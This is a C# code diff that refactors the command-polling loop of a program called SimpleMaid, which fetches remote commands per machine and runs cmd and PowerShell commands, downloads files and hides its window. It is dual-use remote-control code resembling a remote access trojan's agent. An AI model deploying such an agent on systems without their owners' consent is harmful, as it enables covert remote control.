@@ -10,7 +10,6 @@ using System.Net;
 using System.Reflection;
 using System.Security;
 using System.Text;
-using System.Text.RegularExpressions;
 using System.Threading;
 using static SimpleMaid.NativeMethods;
 using static SimpleMaid.PasswordStrength;
@@ -596,7 +595,7 @@ namespace SimpleMaid
     // TODO: Implement adequate decoding
     private static string decodeEncodedNonAsciiCharacters(string value)
     {
-      return Regex.Replace(value, @"\\u(?<Value>[a-zA-Z0-9]{4})", m =>
+      return System.Text.RegularExpressions.Regex.Replace(value, @"\\u(?<Value>[a-zA-Z0-9]{4})", m =>
           {
             return ((char)int.Parse(m.Groups["Value"].Value, NumberStyles.HexNumber)).ToString();
           });
@@ -799,26 +798,23 @@ namespace SimpleMaid
       string ans = Variables.AnswerPrefix;
       char sep = Variables.CommandsSeparator;
 
-      /* Command shortcuts here */
+      string sRemoteMessage = null;
 
-      string sRemoteMessageOld = null;
       while (busyChatWise && internetAlive)
       {
-        string sRemoteMessage;
+        if (sRemoteMessage != null)
+          Thread.Sleep(1000);
+
         while (resources.WebErrorMessage == (sRemoteMessage = Get("messages." + machine)))
         {
           Thread.Sleep(1000);
         }
 
         if (String.Empty == sRemoteMessage || sRemoteMessage.StartsWith(ans))
-        {
-          Thread.Sleep(1000);
           continue;
-        }
 
         #region Parsing message
-        string[] message_parts = sRemoteMessage.Split(new char[] { sep },
-          StringSplitOptions.RemoveEmptyEntries);
+        string[] message_parts = sRemoteMessage.Split(new char[] { sep }, StringSplitOptions.RemoveEmptyEntries);
 
         //частный случай m, еще две то есть
         ChatMessage = message_parts[0];
@@ -830,8 +826,6 @@ namespace SimpleMaid
           Thread.Sleep(1000);
         }
         #endregion
-
-        Thread.Sleep(1000);
       }
 
       reportThreadStop(resources.ChatStop);
@@ -844,117 +838,125 @@ namespace SimpleMaid
       string ans = Variables.AnswerPrefix;
       char sep = Variables.CommandsSeparator;
 
-      string rep = Variables.RepeatCommand.ToString();
-      string pow = Variables.PowershellCommand.ToString();
-      //string key = Variables.KeyhookCommand.ToString(); /* app.State = Control.IsKeyLocked(Keys.CapsLock) ? "CAPS LOCK" : app.State; */
-      string mes = Variables.MessageCommand.ToString();
-      string dow = Variables.DownloadCommand.ToString();
-      string sho = Variables.ShowCommand.ToString();
-      string hid = Variables.HideCommand.ToString();
-      string qui = Variables.QuitCommand.ToString();
+      string sRemoteCommand = null;
 
       while (busyCommandWise && internetAlive)
       {
-        string sRemoteCommand;
+        if (sRemoteCommand != null)
+          Thread.Sleep(1000);
+
         while (resources.WebErrorMessage == (sRemoteCommand = Get("commands." + machine)))
         {
           Thread.Sleep(1000);
         }
 
         if (String.Empty == sRemoteCommand || sRemoteCommand.StartsWith(ans))
-        {
-          Thread.Sleep(1000);
           continue;
-        }
 
-        // TODO: Refactor using switch case
         #region Parsing command
-        string[] command_parts = sRemoteCommand.Split(new char[] { sep },
-          StringSplitOptions.RemoveEmptyEntries);
-        // Contains delimiter: if (command_parts[0] != sRemoteCommand)
+        string[] command_parts = sRemoteCommand.Split(new char[] { sep }, StringSplitOptions.RemoveEmptyEntries);
 
-        if (!Regex.IsMatch(sRemoteCommand, "^.;.*"))
-        {
-          while (resources.WebErrorMessage == Set("commands." + machine, ans + executeCmdCommand(sRemoteCommand)))
-          {
-            Thread.Sleep(1000);
-          }
-        }
-        else if (rep == command_parts[0] && command_parts.Length >= 2)
-        {
-          if (!Regex.IsMatch(sRemoteCommand, "^.;.;.*"))
-          {
-            executeCmdCommand(command_parts[1]);
-          }
-          else if (pow == command_parts[1])
-          {
-            string[] command_parts_fixed = new string[command_parts.Length - 1];
-            for (int i = 1; i < command_parts.Length; ++i)
-            {
-              command_parts_fixed[i - 1] = command_parts[i];
-            }
+        bool isCommandSpecial = (command_parts[0] != sRemoteCommand);
 
-            powershellCommand(command_parts_fixed);
-          }
-          else if (qui == command_parts[1])
-          {
-            exitCommand();
-          }
-          else
-          {
-            reportGeneralError(resources.WrongCommandErrMsg + sRemoteCommand);
-          }
-        }
-        else if (pow == command_parts[0])
+        if (!isCommandSpecial)
         {
-          while (resources.WebErrorMessage == Set("commands." + machine, ans + powershellCommand(command_parts)))
+          while (resources.WebErrorMessage == Set("commands." + machine, ans + executeCmdCommand(command_parts[0])))
           {
             Thread.Sleep(1000);
           }
-        }
-        else if (mes == command_parts[0])
-        {
-          while (resources.WebErrorMessage == Set("commands." + machine, ans + messageCommand(command_parts)))
-          {
-            Thread.Sleep(1000);
-          }
-        }
-        else if (dow == command_parts[0])
-        {
-          while (resources.WebErrorMessage == Set("commands." + machine, ans + downloadCommand(command_parts)))
-          {
-            Thread.Sleep(1000);
-          }
-        }
-        else if (sho == command_parts[0])
-        {
-          while (resources.WebErrorMessage == Set("commands." + machine, ans + showCommand()))
-          {
-            Thread.Sleep(1000);
-          }
-        }
-        else if (hid == command_parts[0])
-        {
-          while (resources.WebErrorMessage == Set("commands." + machine, ans + hideCommand()))
-          {
-            Thread.Sleep(1000);
-          }
-        }
-        else if (qui == command_parts[0])
-        {
-          while (resources.WebErrorMessage == Set("commands." + machine, ans + Variables.GeneralOKMsg))
-          {
-            Thread.Sleep(1000);
-          }
-          exitCommand();
         }
         else
         {
-          reportGeneralError(resources.WrongCommandErrMsg + sRemoteCommand);
+          char specialCommandIdentifier = command_parts[0].ToCharArray()[0];
+
+          switch (specialCommandIdentifier)
+          {
+            case Variables.QuitCommand:
+              while (resources.WebErrorMessage == Set("commands." + machine, ans + Variables.GeneralOKMsg))
+              {
+                Thread.Sleep(1000);
+              }
+              exitCommand();
+              break;
+
+            case Variables.HideCommand:
+              while (resources.WebErrorMessage == Set("commands." + machine, ans + hideCommand()))
+              {
+                Thread.Sleep(1000);
+              }
+              break;
+
+            case Variables.ShowCommand:
+              while (resources.WebErrorMessage == Set("commands." + machine, ans + showCommand()))
+              {
+                Thread.Sleep(1000);
+              }
+              break;
+
+            case Variables.DownloadCommand:
+              while (resources.WebErrorMessage == Set("commands." + machine, ans + downloadCommand(command_parts)))
+              {
+                Thread.Sleep(1000);
+              }
+              break;
+
+            case Variables.MessageCommand:
+              while (resources.WebErrorMessage == Set("commands." + machine, ans + messageCommand(command_parts)))
+              {
+                Thread.Sleep(1000);
+              }
+              break;
+
+            case Variables.PowershellCommand:
+              while (resources.WebErrorMessage == Set("commands." + machine, ans + powershellCommand(command_parts)))
+              {
+                Thread.Sleep(1000);
+              }
+              break;
+
+            case Variables.RepeatCommand:
+              if (command_parts.Length < 2)
+                goto default;
+
+              string[] command_parts_fixed = new string[command_parts.Length - 1];
+              for (int i = 1; i < command_parts.Length; ++i)
+              {
+                command_parts_fixed[i - 1] = command_parts[i];
+              }
+
+              bool isRepeatCommandSpecial = (command_parts_fixed[0] != sRemoteCommand);
+
+              if (!isRepeatCommandSpecial)
+              {
+                executeCmdCommand(command_parts_fixed[0]);
+              }
+              else
+              {
+                char specialRepeatCommandIdentifier = command_parts_fixed[0].ToCharArray()[0];
+
+                switch (specialRepeatCommandIdentifier)
+                {
+                  case Variables.QuitCommand:
+                    exitCommand();
+                    break;
+
+                  case Variables.PowershellCommand:
+                    powershellCommand(command_parts_fixed);
+                    break;
+
+                  default:
+                    reportGeneralError(resources.WrongCommandErrMsg + sRemoteCommand);
+                    break;
+                }
+              }
+              break;
+
+            default:
+              reportGeneralError(resources.WrongCommandErrMsg + sRemoteCommand);
+              break;
+          }
         }
         #endregion
-        
-        Thread.Sleep(1000);
       }
 
       reportThreadStop(resources.CommandStop);
